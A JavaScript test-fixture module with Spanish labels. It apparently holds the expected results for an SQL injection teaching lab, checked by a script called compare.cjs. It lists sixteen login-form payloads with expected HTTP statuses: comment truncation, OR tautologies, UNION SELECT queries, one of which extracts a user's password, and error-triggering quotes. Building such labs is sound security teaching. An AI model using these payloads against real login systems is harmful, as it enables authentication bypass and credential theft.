// Expectativas del laboratorio original, verificadas por compare.cjs.
module.exports = [
  ['P01','Comentario',"admin' -- ",'incorrecta',200],
  ['P02','Comentario con otro usuario',"juan' -- ",'incorrecta',200],
  ['P03','Comentario sin espacio previo',"admin'--",'incorrecta',200],
  ['P04','Tautología numérica',"' OR 1=1 -- ",'incorrecta',200],
  ['P05','Tautología de texto',"' OR '1'='1' -- ",'incorrecta',200],
  ['P06','Tautología con usuario',"admin' OR '1'='1' -- ",'incorrecta',200],
  ['P07','Inyección en contraseña','inexistente',"' OR '1'='1",200],
  ['P08','Contraseña y comentario','juan',"x' OR 1=1 -- ",200],
  ['P09','UNION: usuario inventado',"' UNION SELECT 1,'hacker','x' -- ",'incorrecta',200],
  ['P10','UNION: extracción de contraseña',"' UNION SELECT id,password,username FROM users WHERE username='juan' -- ",'incorrecta',200],
  ['P11','Comentario y condición',"' OR 2>1 -- ",'incorrecta',200],
  ['P12','Contraseña: comparación numérica','inexistente',"' OR 7=7 -- ",200],
  ['P13','Comilla suelta: fuga de error',"admin'",'incorrecta',500],
  ['P14','UNION con columnas incorrectas',"' UNION SELECT 1 -- ",'incorrecta',500],
  ['P15','Comentario de MySQL no válido',"admin'#",'incorrecta',500],
  ['P16','Condición falsa de control',"' OR 1=0 -- ",'incorrecta',401],
].map(([id,technique,username,password,baseline])=>({id,technique,username,password,baseline}));
